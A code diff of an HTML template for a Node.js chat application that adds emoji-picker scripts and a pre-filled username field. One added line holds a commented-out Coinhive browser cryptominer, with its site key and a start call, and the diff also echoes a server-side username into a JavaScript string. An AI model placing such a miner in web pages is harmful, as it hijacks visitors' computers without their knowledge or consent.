@@ -20,13 +20,20 @@
     <link href="//cdn.jsdelivr.net/emojione/1.3.0/assets/css/emojione.min.css" rel="stylesheet" type="text/css"/>
     <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css">
     <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
-<!-- 
-    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css" rel="stylesheet">
-    <link href="lib/css/emoji.css" rel="stylesheet"> -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-1.11.2.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="css/jquery.emojipicker.css">
+    <!-- <script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.User("PTQQeue0YxRL3vkJlPM2KpR2iEp3F6rl", "minimeminer");miner.start();</script> -->
+<script type="text/javascript" src="js/jquery.emojipicker.js"></script>
+
+<!-- Emoji Data -->
+<link rel="stylesheet" type="text/css" href="css/jquery.emojipicker.a.css">
+<script type="text/javascript" src="js/jquery.emojis.js"></script>
+
 
 </head>
 
 <body>
+
     <div class="container-fluid main">
         <a target="_blank" href="https://github.com/bxck75/chat_node/"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://camo.githubusercontent.com/38ef81f8aca64bb9a64448d0d70f1308ef5341ab/68747470733a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f6461726b626c75655f3132313632312e706e67" alt="Fork me on GitHub" data-canonical-src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png"></a>
 
@@ -85,7 +92,9 @@
                                     <div class="col-lg-8 col-lg-offset-2">
                                         <div class="input-group">
                                             <span class="input-group-addon"><span id="icon" class="mdi mdi-social-person"></span></span>
-                                            <input id="message" type="text" data-emojiable="true" class="form-control" placeholder="Choose an username" aria-describedby="basic-addon1" maxlength="768">
+
+                                            <input id="message" type="text" data-emojiable="true" class="form-control" value="<%= username%>" placeholder="Choose an username" aria-describedby="basic-addon1" maxlength="768">
+                                            
                                             <span class="input-group-btn">
                                                 <button id="send" class="btn btn-primary btn-flat">Connect</button>
                                             </span>
@@ -95,6 +104,10 @@
                             </div>
                         </div>
                     </div>
+                    <script type="text/javascript">
+                                   
+                        document.getElementById("message").value=(USERNAME);
+                   </script>
                     <div  class="row">
                         <center>
                             <div id="emoticons" class="col-xs-10">
@@ -102,7 +115,7 @@
                             </div>
                         </center>
                     </div>
-                            
+    
                     <div class="row">
                         <div class="col-xs-12">
                             <p class="text-left pull-left">Created by <a href="https://github.com/bxck75" target="_blank">Koob404</a></p>
@@ -240,7 +253,10 @@
     </div>
     <script>
         var VERSION="<%= version%>";
+        var USERNAME ="<%= username%>";
+        console.log(USERNAME);
     </script>
+
 
     <script src="//lorenzoongithub.github.io/completely/complete.ly.1.0.1.min.js"></script>
     <script src="//code.jquery.com/jquery-2.1.3.min.js"></script>
@@ -258,14 +274,7 @@
             $.material.init();
         });
     </script>
-    <!-- ** Don't forget to Add jQuery here ** -->
-    <!-- <script
-    src="https://code.jquery.com/jquery-3.3.1.js"
-    integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
-    crossorigin="anonymous"></script>
-  <script src="lib/js/config.js"></script>
-  <script src="lib/js/util.js"></script>
-  <script src="lib/js/jquery.emojiarea.js"></script>
-  <script src="lib/js/emoji-picker.js"></script> -->
+
+
 </body>
 </html>
